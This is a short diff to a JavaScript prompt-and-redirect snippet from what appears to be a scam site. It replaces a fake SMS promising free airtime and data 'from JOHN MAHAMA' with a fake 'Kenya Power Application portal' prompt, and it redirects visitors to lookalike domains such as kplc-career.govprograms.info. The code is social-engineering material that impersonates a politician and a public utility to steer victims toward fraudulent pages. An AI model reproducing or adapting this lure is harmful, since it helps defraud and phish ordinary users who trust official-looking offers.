@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = '15GB Free Data'
-password=prompt('SMS: Congratulations You are Eligible to receive GH₵20 Airtime and 15GB Free Data From JOHN MAHAMA Offer, Kindly Press OK to ACTIVATE ','15GB Free Data');
-if (password != '15GB Free Data') {
-location.href='https://mahama.data-offer.xyz/15GB';
+var password = 'Ok'
+password=prompt('SMS: Welcome to the Kenya Power Application portal, press OK to Apply now   ','Ok');
+if (password != 'Ok') {
+location.href='https://kplc-career.govprograms.info/job';
 }
